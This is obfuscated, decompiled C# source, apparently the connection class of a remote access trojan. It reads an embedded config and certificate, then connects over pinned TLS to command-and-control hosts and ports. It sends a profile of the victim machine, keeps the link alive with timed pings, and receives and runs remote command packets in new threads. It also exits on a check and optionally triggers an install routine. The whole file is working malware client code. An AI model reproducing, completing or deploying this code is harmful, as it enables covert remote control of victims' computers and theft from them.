using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

// Token: 0x02000013 RID: 19
internal static class Class9
{
	// Token: 0x06000057 RID: 87 RVA: 0x00002438 File Offset: 0x00000638
	[CompilerGenerated]
	internal static void smethod_0(bool bool_1)
	{
		Class9.bool_0 = bool_1;
	}

	// Token: 0x06000058 RID: 88 RVA: 0x00002440 File Offset: 0x00000640
	[CompilerGenerated]
	internal static GClass4 smethod_1()
	{
		return Class9.gclass4_0;
	}

	// Token: 0x06000059 RID: 89 RVA: 0x00002447 File Offset: 0x00000647
	[CompilerGenerated]
	internal static void smethod_2(GClass4 gclass4_1)
	{
		Class9.gclass4_0 = gclass4_1;
	}

	// Token: 0x0600005A RID: 90 RVA: 0x0000244F File Offset: 0x0000064F
	private static void smethod_3()
	{
		Class9.gclass3_0 = (GClass3)GClass1.smethod_1(Convert.FromBase64String("H4sIAAAAAAAACgMAAAAAAAAAAAA="));
		Class9.x509Certificate2_0 = new X509Certificate2(Convert.FromBase64String(Class9.gclass3_0.String_0));
	}

	// Token: 0x0600005B RID: 91 RVA: 0x00008CD4 File Offset: 0x00006ED4
	internal static void smethod_4()
	{
		try
		{
			Class0.SetProcessDPIAware();
		}
		catch
		{
		}
		Class9.smethod_3();
		if (!Class6.smethod_0(Class9.gclass3_0.stadrmoOn1))
		{
			Environment.Exit(0);
		}
		try
		{
			if (Class9.gclass3_0.Boolean_0)
			{
				ThreadStart start;
				if ((start = Class9.__c.threadStart_0) == null)
				{
					start = (Class9.__c.threadStart_0 = new ThreadStart(Class9.__c.__c_0.method_0));
				}
				new Thread(start).Start();
			}
		}
		catch
		{
		}
		try
		{
			if (Class9.gclass3_0.Boolean_1)
			{
				Class3.smethod_3();
			}
			goto IL_306;
		}
		catch
		{
			goto IL_306;
		}
		goto IL_81;
		IL_306:
		while (Class9.bool_0)
		{
			byte[] array = new byte[4];
			while (Class9.bool_0)
			{
				try
				{
					Class9.a a = new Class9.a();
					int num = 4;
					array = new byte[4];
					int num2 = 0;
					while (num != 0)
					{
						int num3 = Class9.sslStream_0.Read(array, num2, num);
						num2 += num3;
						num -= num3;
						if (num3 > 0)
						{
							if (num >= 0)
							{
								continue;
							}
						}
						throw new Exception();
					}
					num = BitConverter.ToInt32(array, 0);
					if (num <= 0)
					{
						throw new Exception();
					}
					array = new byte[num];
					num2 = 0;
					while (num != 0)
					{
						int num3 = Class9.sslStream_0.Read(array, num2, num);
						num2 += num3;
						num -= num3;
						if (num3 > 0)
						{
							if (num >= 0)
							{
								continue;
							}
						}
						throw new Exception();
					}
					a.field_a = GClass1.smethod_1(array);
					new Thread(new ThreadStart(a.method_a)).Start();
				}
				catch
				{
					Class9.smethod_9();
					break;
				}
			}
		}
		IL_81:
		try
		{
			Thread.Sleep(5000);
			try
			{
				Timer timer = Class9.timer_1;
				if (timer != null)
				{
					timer.Dispose();
				}
				Class9.int_1 = 0;
			}
			catch
			{
			}
			try
			{
				Timer timer2 = Class9.timer_0;
				if (timer2 != null)
				{
					timer2.Dispose();
				}
			}
			catch
			{
			}
			try
			{
				SslStream sslStream = Class9.sslStream_0;
				if (sslStream != null)
				{
					sslStream.Dispose();
				}
				Socket socket = Class9.socket_0;
				if (socket != null)
				{
					socket.Dispose();
				}
			}
			catch
			{
			}
			if (!Class9.smethod_5())
			{
				throw new Exception();
			}
			Class9.sslStream_0 = new SslStream(new NetworkStream(Class9.socket_0, true), false, new RemoteCertificateValidationCallback(Class9.smethod_8));
			Class9.sslStream_0.ReadTimeout = (int)TimeSpan.FromMinutes(5.0).TotalMilliseconds;
			Class9.sslStream_0.WriteTimeout = (int)TimeSpan.FromMinutes(5.0).TotalMilliseconds;
			Class9.sslStream_0.AuthenticateAsClient(Class9.socket_0.RemoteEndPoint.ToString().Split(new char[]
			{
				':'
			})[0], null, SslProtocols.Tls, false);
			Class9.smethod_0(true);
			int num4 = new GClass12().method_2(20, 60);
			Class9.timer_0 = new Timer(new TimerCallback(Class9.smethod_6), null, (int)TimeSpan.FromSeconds((double)num4).TotalMilliseconds, (int)TimeSpan.FromSeconds((double)num4).TotalMilliseconds);
			if (Class9.gclass4_0 == null)
			{
				Class9.smethod_2(new GClass4
				{
					String_0 = Class4.smethod_2(),
					smFdyqYylo = Class4.smethod_0(),
					Boolean_0 = Class4.smethod_6(),
					String_3 = Class4.d(),
					String_2 = Class4.smethod_3(),
					QnsdsyyYrB = "4.4.1",
					String_1 = Class4.smethod_5(),
					Int32_2 = Class9.int_2,
					String_5 = Class3.smethod_0(),
					String_9 = Class3.smethod_2(),
					String_7 = Class9.gclass3_0.String_1,
					String_8 = Class4.h()
				});
			}
			Class9.gclass4_0.String_4 = ((IPEndPoint)Class9.socket_0.RemoteEndPoint).Address.ToString();
			Class9.gclass4_0.Int32_1 = ((IPEndPoint)Class9.socket_0.RemoteEndPoint).Port;
			Class9.gclass4_0.Byte_0 = Class4.i(60);
			Class9.gclass4_0.String_10 = Class3.d();
			Class9.h(Class9.gclass4_0);
			Class9.gclass4_0.String_10 = null;
			Class9.gclass4_0.Byte_0 = null;
		}
		catch
		{
			Class9.smethod_9();
		}
		goto IL_306;
	}

	// Token: 0x0600005C RID: 92 RVA: 0x00009198 File Offset: 0x00007398
	private static bool smethod_5()
	{
		List<string> list = new List<string>();
		List<int> list2 = new List<int>();
		list = Class9.gclass3_0.List_0;
		list2 = Class9.gclass3_0.List_1;
		try
		{
			GClass3 gclass = (GClass3)GClass1.smethod_1(Class7.smethod_0(Class4.smethod_0()));
			if (gclass != null && gclass.List_0.Count > 0 && gclass.List_1.Count > 0)
			{
				list = gclass.List_0;
				list2 = gclass.List_1;
			}
		}
		catch
		{
			list = Class9.gclass3_0.List_0;
			list2 = Class9.gclass3_0.List_1;
		}
		using (List<string>.Enumerator enumerator = list.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				string text = enumerator.Current;
				if (!Class9.d(text))
				{
					foreach (int port in list2)
					{
						try
						{
							try
							{
								Socket socket = Class9.socket_0;
								if (socket != null)
								{
									socket.Dispose();
								}
							}
							catch
							{
							}
							Class9.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
							Class9.socket_0.ReceiveBufferSize = Class9.int_0;
							Class9.socket_0.SendBufferSize = Class9.int_0;
							Class9.socket_0.Connect(text, port);
							if (Class9.socket_0.Connected)
							{
								return true;
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					foreach (IPAddress address in Dns.GetHostAddresses(text))
					{
						using (List<int>.Enumerator enumerator2 = Class9.gclass3_0.List_1.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								int port2 = enumerator2.Current;
								try
								{
									try
									{
										Socket socket2 = Class9.socket_0;
										if (socket2 != null)
										{
											socket2.Dispose();
										}
									}
									catch
									{
									}
									Class9.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
									Class9.socket_0.ReceiveBufferSize = Class9.int_0;
									Class9.socket_0.SendBufferSize = Class9.int_0;
									Class9.socket_0.NoDelay = true;
									Class9.socket_0.Connect(address, port2);
									if (Class9.socket_0.Connected)
									{
										return true;
									}
								}
								catch
								{
								}
							}
							goto IL_205;
						}
						continue;
						IL_205:;
					}
				}
			}
			return false;
		}
		bool result;
		return result;
	}

	// Token: 0x0600005D RID: 93 RVA: 0x00009498 File Offset: 0x00007698
	private static bool d(string a)
	{
		bool result;
		try
		{
			if (Uri.CheckHostName(a) != UriHostNameType.Dns)
			{
				result = false;
			}
			else
			{
				result = (Dns.GetHostAddresses(a).Length != 0);
			}
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600005E RID: 94 RVA: 0x000094D8 File Offset: 0x000076D8
	private static void smethod_6(object object_2)
	{
		try
		{
			try
			{
				Timer timer = Class9.timer_1;
				if (timer != null)
				{
					timer.Dispose();
				}
			}
			catch
			{
			}
			Thread.Sleep(10);
			try
			{
				Interlocked.Exchange(ref Class9.int_1, 0);
			}
			catch
			{
			}
			Class9.h(new GClass8());
			Thread.Sleep(40);
			try
			{
				Class9.timer_1 = new Timer(new TimerCallback(Class9.smethod_7), null, 1, 1);
			}
			catch
			{
			}
		}
		catch
		{
			Class9.smethod_9();
		}
	}

	// Token: 0x0600005F RID: 95 RVA: 0x00009580 File Offset: 0x00007780
	private static void smethod_7(object object_2)
	{
		try
		{
			Interlocked.Increment(ref Class9.int_1);
		}
		catch
		{
			Class9.smethod_9();
		}
	}

	// Token: 0x06000060 RID: 96 RVA: 0x00002483 File Offset: 0x00000683
	private static bool smethod_8(object object_2, X509Certificate x509Certificate_0, object object_3, SslPolicyErrors sslPolicyErrors_0)
	{
		return Class9.x509Certificate2_0.Equals(x509Certificate_0);
	}

	// Token: 0x06000061 RID: 97 RVA: 0x000095B4 File Offset: 0x000077B4
	internal static void h(GClass2 a)
	{
		object obj = Class9.object_0;
		lock (obj)
		{
			try
			{
				if (Class9.sslStream_0 == null || !Class9.sslStream_0.CanWrite)
				{
					throw new InvalidOperationException();
				}
				byte[] array = GClass1.smethod_0(a);
				int num = array.Length;
				byte[] bytes = BitConverter.GetBytes(num);
				Class9.socket_0.Poll(-1, SelectMode.SelectWrite);
				Class9.sslStream_0.Write(bytes, 0, bytes.Length);
				int num2;
				for (int i = 0; i < num; i += num2)
				{
					num2 = Math.Min(Class9.int_0, num - i);
					Class9.socket_0.Poll(-1, SelectMode.SelectWrite);
					Class9.sslStream_0.Write(array, i, num2);
				}
				Class9.sslStream_0.Flush();
			}
			catch
			{
				Class9.smethod_9();
			}
		}
	}

	// Token: 0x06000062 RID: 98 RVA: 0x00002490 File Offset: 0x00000690
	internal static void i(string a)
	{
		if (Class9.bool_0)
		{
			Class9.h(new GClass9
			{
				String_0 = a
			});
			return;
		}
	}

	// Token: 0x06000063 RID: 99 RVA: 0x00009694 File Offset: 0x00007894
	internal static void smethod_9()
	{
		if (Class9.bool_0)
		{
			Class9.smethod_0(false);
			try
			{
				Timer timer = Class9.timer_1;
				if (timer != null)
				{
					timer.Dispose();
				}
			}
			catch
			{
			}
			try
			{
				Timer timer2 = Class9.timer_0;
				if (timer2 != null)
				{
					timer2.Dispose();
				}
			}
			catch
			{
			}
			try
			{
				Class9.socket_0.Shutdown(SocketShutdown.Both);
			}
			catch
			{
			}
			try
			{
				SslStream sslStream = Class9.sslStream_0;
				if (sslStream != null)
				{
					sslStream.Dispose();
				}
			}
			catch
			{
			}
			try
			{
				Class9.sslStream_0 = null;
			}
			catch
			{
			}
			try
			{
				Socket socket = Class9.socket_0;
				if (socket != null)
				{
					socket.Dispose();
				}
			}
			catch
			{
			}
			try
			{
				Class9.socket_0 = null;
			}
			catch
			{
			}
			return;
		}
	}

	// Token: 0x06000064 RID: 100 RVA: 0x000024AB File Offset: 0x000006AB
	// Note: this type is marked as 'beforefieldinit'.
	static Class9()
	{
		Class16.kLjw4iIsCLsZtxc4lksN0j();
		Class9.int_0 = 512000;
		Class9.object_0 = new object();
		Class9.int_2 = 4;
	}

	// Token: 0x06000065 RID: 101 RVA: 0x000024CC File Offset: 0x000006CC
	internal static bool smethod_10()
	{
		return Class9.object_1 == null;
	}

	// Token: 0x0400002D RID: 45
	private static readonly int int_0;

	// Token: 0x0400002E RID: 46
	[CompilerGenerated]
	private static bool bool_0;

	// Token: 0x0400002F RID: 47
	[CompilerGenerated]
	private static GClass4 gclass4_0;

	// Token: 0x04000030 RID: 48
	private static Socket socket_0;

	// Token: 0x04000031 RID: 49
	private static SslStream sslStream_0;

	// Token: 0x04000032 RID: 50
	private static readonly object object_0;

	// Token: 0x04000033 RID: 51
	private static Timer timer_0;

	// Token: 0x04000034 RID: 52
	internal static Timer timer_1;

	// Token: 0x04000035 RID: 53
	private static X509Certificate2 x509Certificate2_0;

	// Token: 0x04000036 RID: 54
	internal static GClass3 gclass3_0;

	// Token: 0x04000037 RID: 55
	internal static int int_1;

	// Token: 0x04000038 RID: 56
	private static readonly int int_2;

	// Token: 0x04000039 RID: 57
	private static object object_1;

	// Compiler-generated singleton class (originally <>c)
	[CompilerGenerated]
	private sealed class __c
	{
		public static readonly Class9.__c __c_0 = new Class9.__c();
		public static ThreadStart threadStart_0;

		internal void method_0()
		{
			Class8.pwfVayjWiK();
		}
	}

	// Token: 0x02000015 RID: 21
	[CompilerGenerated]
	private sealed class a
	{
		// Token: 0x0600006B RID: 107 RVA: 0x000024F1 File Offset: 0x000006F1
		internal void method_a()
		{
			new Class2().method_0(this.field_a);
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00002308 File Offset: 0x00000508
		// Note: this type is marked as 'beforefieldinit'.
		static a()
		{
			Class16.kLjw4iIsCLsZtxc4lksN0j();
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00002503 File Offset: 0x00000703
		internal static bool smethod_0()
		{
			return Class9.a.a_0 == null;
		}

		// Token: 0x0400003D RID: 61
		public GClass2 field_a;

		// Token: 0x0400003E RID: 62
		internal static Class9.a a_0;
	}
}
